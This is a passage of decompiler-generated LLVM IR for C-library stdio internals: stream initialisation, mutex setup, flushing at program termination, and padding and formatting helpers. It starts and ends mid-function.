  %v1_804a2e2 = mul nuw nsw i32 %v1_804a2de, 16
  %v2_804a2e5 = xor i32 %v1_804a2e2, 48
  store i32 %v2_804a2e5, i32* %eax.global-to-local, align 4
  %v2_804a2e8 = or i32 %v4_804a2df, %v2_804a2e5
  store i32 %v2_804a2e8, i32* @ebx, align 4
  %v1_804a2ea = trunc i32 %v2_804a2e8 to i16
  %v3_804a2ea = inttoptr i32 %v1_804a2df to i16*
  store i16 %v1_804a2ea, i16* %v3_804a2ea, align 2
  %v0_804a2ee = load i32, i32* %stack_var_-76, align 4
  %v1_804a2ee = call i32 @__errno_location(i32 %v0_804a2ee)
  store i32 %v1_804a2ee, i32* %eax.global-to-local, align 4
  store i32 %v1_804a2ee, i32* @esi, align 4
  %v1_804a2f8 = inttoptr i32 %v1_804a2ee to i32*
  %v2_804a2f8 = load i32, i32* %v1_804a2f8, align 4
  store i32 %v2_804a2f8, i32* @edi, align 4
  %v0_804a2fa = load i32, i32* @ebp, align 4
  %v1_804a2fa = add i32 %v0_804a2fa, 4
  %v2_804a2fa = inttoptr i32 %v1_804a2fa to i32*
  %v3_804a2fa = load i32, i32* %v2_804a2fa, align 4
  store i32 %v3_804a2fa, i32* %stack_var_-76, align 4
  %v1_804a2fd = call i32 @isatty(i32 %v3_804a2fa)
  %v2_804a305 = mul i32 %v1_804a2fd, 256
  store i32 %v2_804a305, i32* %eax.global-to-local, align 4
  %v0_804a308 = load i32, i32* @ebx, align 4
  %v2_804a308 = or i32 %v0_804a308, %v2_804a305
  store i32 %v2_804a308, i32* @ebx, align 4
  %v1_804a30a = trunc i32 %v2_804a308 to i16
  %v2_804a30a = load i32, i32* @ebp, align 4
  %v3_804a30a = inttoptr i32 %v2_804a30a to i16*
  store i16 %v1_804a30a, i16* %v3_804a30a, align 2
  %v0_804a30e = load i32, i32* @edi, align 4
  %v1_804a30e = load i32, i32* @esi, align 4
  %v2_804a30e = inttoptr i32 %v1_804a30e to i32*
  store i32 %v0_804a30e, i32* %v2_804a30e, align 4
  %v0_804a310 = load i32, i32* @ebp, align 4
  %v1_804a310 = add i32 %v0_804a310, 8
  %v2_804a310 = inttoptr i32 %v1_804a310 to i32*
  %v3_804a310 = load i32, i32* %v2_804a310, align 4
  %v4_804a310 = icmp eq i32 %v3_804a310, 0
  %v1_804a314 = icmp eq i1 %v4_804a310, false
  br i1 %v1_804a314, label %dec_label_pc_804a344, label %dec_label_pc_804a316

dec_label_pc_804a316:                             ; preds = %dec_label_pc_804a2ce
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804a31e = call i32 @malloc(i32 4096)
  store i32 %v1_804a31e, i32* %eax.global-to-local, align 4
  %v1_804a326 = load i32, i32* @ebp, align 4
  %v2_804a326 = add i32 %v1_804a326, 8
  %v3_804a326 = inttoptr i32 %v2_804a326 to i32*
  store i32 %v1_804a31e, i32* %v3_804a326, align 4
  %v1_804a329 = icmp eq i32 %v1_804a31e, 0
  %v0_804a33d = load i32, i32* @ebp, align 4
  br i1 %v1_804a329, label %dec_label_pc_804a33d, label %dec_label_pc_804a32d

dec_label_pc_804a32d:                             ; preds = %dec_label_pc_804a316
  %v1_804a32d = inttoptr i32 %v0_804a33d to i16*
  %v2_804a32d = load i16, i16* %v1_804a32d, align 2
  %v3_804a32d = or i16 %v2_804a32d, 16384
  store i16 %v3_804a32d, i16* %v1_804a32d, align 2
  %v1_804a333 = add i32 %v1_804a31e, 4096
  store i32 %v1_804a333, i32* %eax.global-to-local, align 4
  %v1_804a338 = load i32, i32* @ebp, align 4
  %v2_804a338 = add i32 %v1_804a338, 12
  %v3_804a338 = inttoptr i32 %v2_804a338 to i32*
  store i32 %v1_804a333, i32* %v3_804a338, align 4
  br label %dec_label_pc_804a344

dec_label_pc_804a33d:                             ; preds = %dec_label_pc_804a316
  %v1_804a33d = add i32 %v0_804a33d, 12
  %v2_804a33d = inttoptr i32 %v1_804a33d to i32*
  store i32 0, i32* %v2_804a33d, align 4
  br label %dec_label_pc_804a344

dec_label_pc_804a344:                             ; preds = %dec_label_pc_804a2ce, %dec_label_pc_804a32d, %dec_label_pc_804a33d
  %v0_804a344 = load i32, i32* @ebp, align 4
  %v1_804a344 = add i32 %v0_804a344, 8
  %v2_804a344 = inttoptr i32 %v1_804a344 to i32*
  %v3_804a344 = load i32, i32* %v2_804a344, align 4
  store i32 %v3_804a344, i32* %eax.global-to-local, align 4
  %v1_804a347 = add i32 %v0_804a344, 2
  %v2_804a347 = inttoptr i32 %v1_804a347 to i8*
  store i8 0, i8* %v2_804a347, align 1
  %v0_804a34b = load i32, i32* %eax.global-to-local, align 4
  %v1_804a34b = load i32, i32* @ebp, align 4
  %v2_804a34b = add i32 %v1_804a34b, 24
  %v3_804a34b = inttoptr i32 %v2_804a34b to i32*
  store i32 %v0_804a34b, i32* %v3_804a34b, align 4
  %v0_804a34e = load i32, i32* %eax.global-to-local, align 4
  %v1_804a34e = load i32, i32* @ebp, align 4
  %v2_804a34e = add i32 %v1_804a34e, 28
  %v3_804a34e = inttoptr i32 %v2_804a34e to i32*
  store i32 %v0_804a34e, i32* %v3_804a34e, align 4
  %v0_804a351 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a351 = load i32, i32* @ebp, align 4
  %v2_804a351 = add i32 %v1_804a351, 16
  %v3_804a351 = inttoptr i32 %v2_804a351 to i32*
  store i32 %v0_804a351, i32* %v3_804a351, align 4
  %v0_804a354 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a354 = load i32, i32* @ebp, align 4
  %v2_804a354 = add i32 %v1_804a354, 20
  %v3_804a354 = inttoptr i32 %v2_804a354 to i32*
  store i32 %v0_804a354, i32* %v3_804a354, align 4
  %v0_804a357 = load i32, i32* @ebp, align 4
  %v1_804a357 = add i32 %v0_804a357, 44
  %v2_804a357 = inttoptr i32 %v1_804a357 to i32*
  store i32 0, i32* %v2_804a357, align 4
  %v0_804a35e = load i32, i32* @ebp, align 4
  %v1_804a35e = add i32 %v0_804a35e, 1
  %v2_804a35e = inttoptr i32 %v1_804a35e to i8*
  %v3_804a35e = load i8, i8* %v2_804a35e, align 1
  %v4_804a35e = and i8 %v3_804a35e, 32
  %v5_804a35e = icmp eq i8 %v4_804a35e, 0
  %v0_804a362 = load i32, i32* @global_var_8054108.316, align 8
  store i32 %v0_804a362, i32* @eax, align 4
  %v2_804a367 = add i32 %v0_804a35e, 52
  %v3_804a367 = inttoptr i32 %v2_804a367 to i32*
  store i32 %v0_804a362, i32* %v3_804a367, align 4
  br i1 %v5_804a35e, label %dec_label_pc_804a3d9, label %dec_label_pc_804a36c

dec_label_pc_804a36c:                             ; preds = %dec_label_pc_804a344
  %v2_804a377 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804a377, i32* %stack_var_-76, align 4
  %v2_804a37c = call i32 @__pthread_return_void(i32 %v2_804a377, i32 134534955)
  store i32 %v2_804a37c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80540f0.313 to i32), i32* %stack_var_-76, align 4
  %v1_804a388 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80540f0.313 to i32))
  store i32 %v1_804a388, i32* @eax, align 4
  %v2_804a39a = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804a39a, i32* %stack_var_-76, align 4
  %v2_804a39f = call i32 @__pthread_return_void(i32 %v2_804a39a, i32 134534955)
  store i32 %v2_804a39f, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80540d8.317 to i32), i32* %stack_var_-76, align 4
  %v1_804a3ab = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80540d8.317 to i32))
  %v0_804a3b0 = load i32, i32* bitcast (i32** @global_var_80540d4.318 to i32*), align 4
  store i32 %v0_804a3b0, i32* @eax, align 4
  %v1_804a3b5 = load i32, i32* @ebp, align 4
  %v2_804a3b5 = add i32 %v1_804a3b5, 32
  %v3_804a3b5 = inttoptr i32 %v2_804a3b5 to i32*
  store i32 %v0_804a3b0, i32* %v3_804a3b5, align 4
  %v0_804a3b8 = load i32, i32* @ebp, align 4
  store i32 %v0_804a3b8, i32* bitcast (i32** @global_var_80540d4.318 to i32*), align 4
  %v2_804a3be = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804a3be, i32* @ecx, align 4
  store i32 %v2_804a39a, i32* %stack_var_-76, align 4
  %v2_804a3c3 = call i32 @__pthread_return_void(i32 %v2_804a39a, i32 1)
  store i32 %v2_804a39a, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804a377, i32* %stack_var_-76, align 4
  %v2_804a3cd = call i32 @__pthread_return_void(i32 %v2_804a377, i32 1)
  store i32 %v2_804a3cd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a3d2

dec_label_pc_804a3d2:                             ; preds = %dec_label_pc_804a1ff, %dec_label_pc_804a36c
  br label %dec_label_pc_804a3d9

dec_label_pc_804a3d7:                             ; preds = %dec_label_pc_804a1f5, %dec_label_pc_804a1e2
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804a3d9

dec_label_pc_804a3d9:                             ; preds = %dec_label_pc_804a344, %dec_label_pc_804a22e, %dec_label_pc_804a3d2, %dec_label_pc_804a3d7
  %v0_804a3dc = load i32, i32* @ebp, align 4
  store i32 %v0_804a3dc, i32* %eax.global-to-local, align 4
  %v2_804a3de = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804a3de, i32* @ebx, align 4
  store i32 %v0_804a1b6, i32* @esi, align 4
  store i32 %v0_804a1b5, i32* @edi, align 4
  store i32 %v0_804a1b4, i32* @ebp, align 4
  ret i32 %v0_804a3dc

; uselistorder directives
  uselistorder i32 %v2_804a39a, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804a377, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804a33d, { 1, 0 }
  uselistorder i32 %v1_804a31e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804a305, { 1, 0 }
  uselistorder i32 %v1_804a2ee, { 1, 0, 2 }
  uselistorder i32 %v11_804a2b0, { 1, 0 }
  uselistorder i32 %v0_804a2b9.pre, { 1, 0 }
  uselistorder i32 %v1_804a281, { 2, 1, 0 }
  uselistorder i32 %v0_804a27d, { 1, 0 }
  uselistorder i32 %v1_804a272, { 1, 0, 2 }
  uselistorder i32 %v1_804a233, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_804a222, { 1, 0 }
  uselistorder i32 %v0_804a1f5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29 }
  uselistorder i32 %arg4, { 3, 2, 1, 0, 4, 5 }
  uselistorder label %dec_label_pc_804a3d9, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804a3d2, { 1, 0 }
  uselistorder label %dec_label_pc_804a344, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a2b3, { 1, 0 }
  uselistorder label %dec_label_pc_804a2a3, { 1, 0 }
  uselistorder label %dec_label_pc_804a260, { 1, 0 }
  uselistorder label %dec_label_pc_804a22a, { 1, 0 }
  uselistorder label %dec_label_pc_804a21c, { 1, 0 }
  uselistorder label %dec_label_pc_804a211, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a3e5 = load i32, i32* @edi, align 4
  %v0_804a3e6 = load i32, i32* @esi, align 4
  %v0_804a3e7 = load i32, i32* @ebx, align 4
  store i32 %v0_804a3e7, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804a3f0 = call i32 @__errno_location(i32 %v0_804a3e7)
  store i32 %v1_804a3f0, i32* @edi, align 4
  %v0_804a3fa = load i32, i32* @global_var_8054120.309, align 32
  store i32 %v0_804a3fa, i32* @esi, align 4
  %v1_804a400 = inttoptr i32 %v1_804a3f0 to i32*
  %v2_804a400 = load i32, i32* %v1_804a400, align 4
  store i32 %v2_804a400, i32* %ebp.global-to-local, align 4
  %v1_804a404 = call i32 @isatty(i32 0)
  %v0_804a409 = load i32, i32* @ebx, align 4
  %v2_804a40b = sub i32 %v0_804a409, %v1_804a404
  %v2_804a416 = mul i32 %v2_804a40b, 256
  %v0_804a419 = load i32, i32* @esi, align 4
  %v2_804a419 = xor i32 %v0_804a419, %v2_804a416
  %v1_804a41b = trunc i32 %v2_804a419 to i16
  store i16 %v1_804a41b, i16* bitcast (i32* @global_var_8054120.309 to i16*), align 32
  %v0_804a422 = load i32, i32* @global_var_8054170.310, align 16
  store i32 %v0_804a422, i32* @esi, align 4
  %v1_804a428 = call i32 @isatty(i32 1)
  %v0_804a42d = load i32, i32* @ebx, align 4
  %v2_804a42d = sub i32 %v0_804a42d, %v1_804a428
  %v2_804a42f = mul i32 %v2_804a42d, 256
  %v0_804a432 = load i32, i32* @esi, align 4
  %v2_804a432 = xor i32 %v2_804a42f, %v0_804a432
  %v1_804a434 = trunc i32 %v2_804a432 to i16
  store i16 %v1_804a434, i16* bitcast (i32* @global_var_8054170.310 to i16*), align 16
  %v0_804a43b = load i32, i32* %ebp.global-to-local, align 4
  %v1_804a43b = load i32, i32* @edi, align 4
  %v2_804a43b = inttoptr i32 %v1_804a43b to i32*
  store i32 %v0_804a43b, i32* %v2_804a43b, align 4
  %v2_804a440 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804a440, i32* @ebx, align 4
  store i32 %v0_804a3e6, i32* @esi, align 4
  store i32 %v0_804a3e5, i32* @edi, align 4
  ret i32 %v1_804a428

; uselistorder directives
  uselistorder i32 %v1_804a3f0, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804a453 = inttoptr i32 %arg1 to i16*
  %v4_804a453 = call i32 @memcpy(i16* %v3_804a453, i32 ptrtoint (i32* @global_var_80515a0.319 to i32), i32 24)
  ret i32 %v4_804a453
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804a45c = load i32, i32* @esi, align 4
  %v0_804a45d = load i32, i32* @ebx, align 4
  store i32 %v0_804a45d, i32* %stack_var_-8, align 4
  %v1_804a466 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80540d8.317 to i32))
  store i32 %v1_804a466, i32* %eax.global-to-local, align 4
  %v1_804a472 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80540f0.313 to i32))
  store i32 %v1_804a472, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_80540d4.318 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804a4bc22 = icmp eq i32 %storemerge21, 0
  %v1_804a4be23 = icmp eq i1 %v1_804a4bc22, false
  br i1 %v1_804a4be23, label %dec_label_pc_804a47f.lr.ph, label %dec_label_pc_804a4dc.preheader

dec_label_pc_804a47f.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804a47f

dec_label_pc_804a47f:                             ; preds = %dec_label_pc_804a47f.lr.ph, %dec_label_pc_804a4a6
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_804a47f.lr.ph ], [ %storemerge, %dec_label_pc_804a4a6 ]
  %v1_804a482 = add i32 %storemerge24, 56
  store i32 %v1_804a482, i32* @esi, align 4
  %v1_804a486 = call i32 @__pthread_return_0(i32 %v1_804a482)
  store i32 %v1_804a486, i32* %eax.global-to-local, align 4
  %v1_804a48e = icmp eq i32 %v1_804a486, 0
  br i1 %v1_804a48e, label %dec_label_pc_804a4a6, label %dec_label_pc_804a492

dec_label_pc_804a492:                             ; preds = %dec_label_pc_804a47f
  %v0_804a492 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a492 = add i32 %v0_804a492, 8
  %v2_804a492 = inttoptr i32 %v1_804a492 to i32*
  %v3_804a492 = load i32, i32* %v2_804a492, align 4
  store i32 %v3_804a492, i32* %eax.global-to-local, align 4
  %v1_804a495 = inttoptr i32 %v0_804a492 to i16*
  store i16 48, i16* %v1_804a495, align 2
  %v0_804a49a = load i32, i32* %eax.global-to-local, align 4
  %v1_804a49a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a49a = add i32 %v1_804a49a, 24
  %v3_804a49a = inttoptr i32 %v2_804a49a to i32*
  store i32 %v0_804a49a, i32* %v3_804a49a, align 4
  %v0_804a49d = load i32, i32* %eax.global-to-local, align 4
  %v1_804a49d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a49d = add i32 %v1_804a49d, 28
  %v3_804a49d = inttoptr i32 %v2_804a49d to i32*
  store i32 %v0_804a49d, i32* %v3_804a49d, align 4
  %v0_804a4a0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a4a0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a4a0 = add i32 %v1_804a4a0, 16
  %v3_804a4a0 = inttoptr i32 %v2_804a4a0 to i32*
  store i32 %v0_804a4a0, i32* %v3_804a4a0, align 4
  %v0_804a4a3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a4a3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a4a3 = add i32 %v1_804a4a3, 20
  %v3_804a4a3 = inttoptr i32 %v2_804a4a3 to i32*
  store i32 %v0_804a4a3, i32* %v3_804a4a3, align 4
  br label %dec_label_pc_804a4a6

dec_label_pc_804a4a6:                             ; preds = %dec_label_pc_804a47f, %dec_label_pc_804a492
  %v0_804a4a9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a4a9 = add i32 %v0_804a4a9, 52
  %v2_804a4a9 = inttoptr i32 %v1_804a4a9 to i32*
  store i32 1, i32* %v2_804a4a9, align 4
  %v0_804a4b0 = load i32, i32* @esi, align 4
  %v1_804a4b1 = call i32 @__stdio_init_mutex(i32 %v0_804a4b0)
  store i32 %v1_804a4b1, i32* %eax.global-to-local, align 4
  %v0_804a4b6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a4b6 = add i32 %v0_804a4b6, 32
  %v2_804a4b6 = inttoptr i32 %v1_804a4b6 to i32*
  %storemerge = load i32, i32* %v2_804a4b6, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804a4bc = icmp eq i32 %storemerge, 0
  %v1_804a4be = icmp eq i1 %v1_804a4bc, false
  br i1 %v1_804a4be, label %dec_label_pc_804a47f, label %dec_label_pc_804a4b9.dec_label_pc_804a4dc.preheader_crit_edge

dec_label_pc_804a4b9.dec_label_pc_804a4dc.preheader_crit_edge: ; preds = %dec_label_pc_804a4a6
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_80540d4.318 to i32*), align 4
  br label %dec_label_pc_804a4dc.preheader

dec_label_pc_804a4dc.preheader:                   ; preds = %dec_label_pc_804a4b9.dec_label_pc_804a4dc.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804a4b9.dec_label_pc_804a4dc.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804a4dc3 = icmp eq i32 %storemerge12, 0
  %v1_804a4de10 = icmp eq i1 %v1_804a4dc3, false
  br i1 %v1_804a4de10, label %dec_label_pc_804a4c8.preheader, label %dec_label_pc_804a4e0

dec_label_pc_804a4c8.preheader:                   ; preds = %dec_label_pc_804a4dc.preheader
  br label %dec_label_pc_804a4c8

dec_label_pc_804a4c8:                             ; preds = %dec_label_pc_804a4c8.preheader, %dec_label_pc_804a4d9
  %v0_804a4d0 = phi i32 [ %storemerge1, %dec_label_pc_804a4d9 ], [ %storemerge12, %dec_label_pc_804a4c8.preheader ]
  %v1_804a4c8 = inttoptr i32 %v0_804a4d0 to i8*
  %v2_804a4c8 = load i8, i8* %v1_804a4c8, align 1
  %v3_804a4c8 = and i8 %v2_804a4c8, 64
  %v4_804a4c8 = icmp eq i8 %v3_804a4c8, 0
  br i1 %v4_804a4c8, label %dec_label_pc_804a4d9, label %dec_label_pc_804a4cd

dec_label_pc_804a4cd:                             ; preds = %dec_label_pc_804a4c8
  %v1_804a4d1 = call i32 @__stdio_wcommit(i32 %v0_804a4d0)
  store i32 %v1_804a4d1, i32* %eax.global-to-local, align 4
  %v0_804a4d9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a4d9

dec_label_pc_804a4d9:                             ; preds = %dec_label_pc_804a4c8, %dec_label_pc_804a4cd
  %v0_804a4d9 = phi i32 [ %v0_804a4d0, %dec_label_pc_804a4c8 ], [ %v0_804a4d9.pre, %dec_label_pc_804a4cd ]
  %v1_804a4d9 = add i32 %v0_804a4d9, 32
  %v2_804a4d9 = inttoptr i32 %v1_804a4d9 to i32*
  %storemerge1 = load i32, i32* %v2_804a4d9, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804a4dc = icmp eq i32 %storemerge1, 0
  %v1_804a4de = icmp eq i1 %v1_804a4dc, false
  br i1 %v1_804a4de, label %dec_label_pc_804a4c8, label %dec_label_pc_804a4e0

dec_label_pc_804a4e0:                             ; preds = %dec_label_pc_804a4d9, %dec_label_pc_804a4dc.preheader
  %v2_804a4e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804a4e0, i32* %eax.global-to-local, align 4
  %v2_804a4e1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804a4e1, i32* @ebx, align 4
  store i32 %v0_804a45c, i32* @esi, align 4
  ret i32 %v2_804a4e0

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_804a4d9, { 1, 0 }
  uselistorder label %dec_label_pc_804a4c8, { 1, 0 }
  uselistorder label %dec_label_pc_804a4a6, { 1, 0 }
  uselistorder label %dec_label_pc_804a47f, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804a4e4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804a4ec = add i32 %arg1, 8
  %v2_804a4ec = inttoptr i32 %v1_804a4ec to i32*
  %v3_804a4ec = load i32, i32* %v2_804a4ec, align 4
  store i32 %v3_804a4ec, i32* %edx.global-to-local, align 4
  %v1_804a4ef = add i32 %arg1, 16
  %v2_804a4ef = inttoptr i32 %v1_804a4ef to i32*
  %v3_804a4ef = load i32, i32* %v2_804a4ef, align 4
  %v2_804a4f2 = sub i32 %v3_804a4ef, %v3_804a4ec
  %v12_804a4f2 = icmp eq i32 %v2_804a4f2, 0
  store i32 %v2_804a4f2, i32* %eax.global-to-local, align 4
  br i1 %v12_804a4f2, label %dec_label_pc_804a505, label %dec_label_pc_804a4f6

dec_label_pc_804a4f6:                             ; preds = %entry
  store i32 %v3_804a4ec, i32* %v2_804a4ef, align 4
  %v0_804a4f9 = load i32, i32* @ecx, align 4
  %v0_804a4fa = load i32, i32* %eax.global-to-local, align 4
  %v0_804a4fb = load i32, i32* %edx.global-to-local, align 4
  %v0_804a4fc = load i32, i32* @ebx, align 4
  %v4_804a4fd = inttoptr i32 %v0_804a4fc to i16*
  %v5_804a4fd = call i32 @__stdio_WRITE(i16* %v4_804a4fd, i32 %v0_804a4fb, i32 %v0_804a4fa, i32 %v0_804a4f9)
  store i32 %v5_804a4fd, i32* %eax.global-to-local, align 4
  %v0_804a505.pre = load i32, i32* @ebx, align 4
  %v2_804a50b.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804a505

dec_label_pc_804a505:                             ; preds = %entry, %dec_label_pc_804a4f6
  %v2_804a50b = phi i32 [ %tmp11, %entry ], [ %v2_804a50b.pre, %dec_label_pc_804a4f6 ]
  %v0_804a505 = phi i32 [ %arg1, %entry ], [ %v0_804a505.pre, %dec_label_pc_804a4f6 ]
  %v1_804a505 = add i32 %v0_804a505, 16
  %v2_804a505 = inttoptr i32 %v1_804a505 to i32*
  %v3_804a505 = load i32, i32* %v2_804a505, align 4
  store i32 %v3_804a505, i32* %eax.global-to-local, align 4
  %v2_804a508 = add i32 %v0_804a505, 8
  %v3_804a508 = inttoptr i32 %v2_804a508 to i32*
  %v4_804a508 = load i32, i32* %v3_804a508, align 4
  %v5_804a508 = sub i32 %v3_804a505, %v4_804a508
  store i32 %v5_804a508, i32* %eax.global-to-local, align 4
  store i32 %v2_804a50b, i32* @edx, align 4
  store i32 %v0_804a4e4, i32* @ebx, align 4
  ret i32 %v5_804a508

; uselistorder directives
  uselistorder i32 %v0_804a505, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804a505, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804a510 = load i32, i32* @edi, align 4
  %v0_804a511 = load i32, i32* @esi, align 4
  %v0_804a512 = load i32, i32* @ebx, align 4
  %v0_804a513 = load i32, i32* @eax, align 4
  store i32 %v0_804a513, i32* @edi, align 4
  %v0_804a518 = load i32, i32* @ecx, align 4
  store i32 %v0_804a518, i32* @esi, align 4
  store i32 %v0_804a518, i32* @ebx, align 4
  %v0_804a51c = load i32, i32* @edx, align 4
  store i32 %v0_804a51c, i32* %stack_var_-13, align 4
  %v1_804a5232 = icmp eq i32 %v0_804a518, 0
  br i1 %v1_804a5232, label %dec_label_pc_804a53b, label %dec_label_pc_804a527.lr.ph

dec_label_pc_804a527.lr.ph:                       ; preds = %entry
  %v2_804a527 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804a527

dec_label_pc_804a522:                             ; preds = %dec_label_pc_804a527
  %v1_804a522 = add i32 %v0_804a522, -1
  %v8_804a522 = icmp eq i32 %v1_804a522, 0
  store i32 %v1_804a522, i32* @ebx, align 4
  br i1 %v8_804a522, label %dec_label_pc_804a53b.loopexit, label %dec_label_pc_804a522.dec_label_pc_804a527_crit_edge

dec_label_pc_804a522.dec_label_pc_804a527_crit_edge: ; preds = %dec_label_pc_804a522
  %v0_804a52b.pre = load i32, i32* @edx, align 4
  %v0_804a52c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804a527

dec_label_pc_804a527:                             ; preds = %dec_label_pc_804a522.dec_label_pc_804a527_crit_edge, %dec_label_pc_804a527.lr.ph
  %v0_804a52c = phi i32 [ %v0_804a52c.pre, %dec_label_pc_804a522.dec_label_pc_804a527_crit_edge ], [ %v0_804a513, %dec_label_pc_804a527.lr.ph ]
  %v0_804a52b = phi i32 [ %v0_804a52b.pre, %dec_label_pc_804a522.dec_label_pc_804a527_crit_edge ], [ %v0_804a51c, %dec_label_pc_804a527.lr.ph ]
  %v4_804a530 = call i32 @__stdio_fwrite(i32 %v2_804a527, i32 1, i32 %v0_804a52c, i32 %v0_804a52b)
  %v8_804a538 = icmp eq i32 %v4_804a530, 1
  %v0_804a522 = load i32, i32* @ebx, align 4
  br i1 %v8_804a538, label %dec_label_pc_804a522, label %dec_label_pc_804a53b.loopexit

dec_label_pc_804a53b.loopexit:                    ; preds = %dec_label_pc_804a522, %dec_label_pc_804a527
  %v1_804a53b.ph = phi i32 [ %v0_804a522, %dec_label_pc_804a527 ], [ 0, %dec_label_pc_804a522 ]
  %v0_804a53b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a53b

dec_label_pc_804a53b:                             ; preds = %dec_label_pc_804a53b.loopexit, %entry
  %v0_804a53b = phi i32 [ 0, %entry ], [ %v0_804a53b.pre, %dec_label_pc_804a53b.loopexit ]
  %v1_804a53b = phi i32 [ 0, %entry ], [ %v1_804a53b.ph, %dec_label_pc_804a53b.loopexit ]
  %v2_804a53b = sub i32 %v0_804a53b, %v1_804a53b
  store i32 %v0_804a512, i32* @ebx, align 4
  store i32 %v0_804a511, i32* @esi, align 4
  store i32 %v0_804a510, i32* @edi, align 4
  ret i32 %v2_804a53b

; uselistorder directives
  uselistorder i32 %v1_804a522, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804a53b.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804a559 = trunc i32 %arg2 to i8
  %v5_804a559 = icmp slt i8 %v3_804a559, 0
  %v1_804a55b = icmp eq i1 %v5_804a559, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804a55b, label %dec_label_pc_804a58c, label %dec_label_pc_804a55d

dec_label_pc_804a55d:                             ; preds = %entry
  %v3_804a564 = call i32 @strlen(i8* %arg4)
